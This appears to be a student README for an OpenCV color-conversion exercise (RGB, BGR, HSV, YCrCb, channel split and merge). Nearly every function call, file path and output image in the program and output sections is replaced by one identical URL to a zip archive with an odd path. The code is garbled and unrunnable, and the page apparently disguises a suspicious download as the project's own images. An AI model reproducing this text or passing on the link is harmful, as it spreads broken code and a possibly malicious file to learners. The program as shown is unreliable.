# Color Conversion
## AIM
To perform the color conversion between RGB, BGR, HSV, and YCbCr color models.

## Software Required:
Anaconda - Python 3.7
## Algorithm:
### Step1:
Import CV2 library.
<br>
### Step2:
Use https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip() to convert colot in required image
<br>
### Step3:
Use .imshow() to display and .imwrite() to save.
<br>
### Step4:
Use split() to disperse color into separate channels.
<br>
### Step5:
Use merge() to combine those separate channels into color.
<br>

## Program:
```python
# Developed By: Kiran J
# Register Number: 212221240022
# i) Convert BGR and RGB to HSV and GRAY

import cv2
house_color_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Original image',house_color_image)
#BGR 2 HSV
hsv_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('BGR2HSV',hsv_image)
#RGB 2 HSV
hsv_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('RGB2HSV',hsv_image1)
# BGR 2 GRAY
gray_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('BGR2GRAY',gray_image)
# RGB 2 GRAY
gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(house_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('RGB2GRAY',gray_image1)

https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip()

# ii)Convert HSV to RGB and BGR

import cv2
sun_color_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Original image', sun_color_image)
hsv_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('HSV2RGB' ,hsv_image )
gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip (sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('HSV2BGR', gray_image1)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
cv2. destroyAllWindows()

# iii)Convert RGB and BGR to YCrCb

import cv2
sun_color_image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Original image', sun_color_image)
gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip (sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('RGB2YCrCb', gray_image1)
gray_image1 = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip (sun_color_image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('BGR2YCrCb', gray_image1)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
cv2. destroyAllWindows()

# iv)Split and Merge RGB Image

import cv2
image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
blue=image[:,:,0]
green=image[:,:,1]
red=image[:,:,2]
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('B-Channel',blue)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('G-Channel',green)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('R-Channel',red)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip((blue,green,red))
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Merged BGR Image',merged_BGR)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip()

# v) Split and merge HSV Image

import cv2
image = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip')
hsv = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(image, https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
h,s,v = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(hsv)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('H',h)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('S',s)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('V',v)
Merged_HSV = https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip((h,s,v))
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip('Merged HSV Image',Merged_HSV)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip(0)
https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip()

```
## Output:
### i) BGR and RGB to HSV and GRAY
![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
<br>
<br>

### ii) HSV to RGB and BGR
![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
<br>
<br>

### iii) RGB and BGR to YCrCb
![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
<br>
<br>

### iv) Split and merge RGB Image
![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
<br>
<br>

### v) Split and merge HSV Image
![Output](https://raw.githubusercontent.com/kiran03-jagadeesh/Color-Conversion/main/amoralism/Color-Conversion-depravingly.zip)
<br>
<br>


## Result:
Thus the color conversion was performed between RGB, HSV and YCbCr color models.
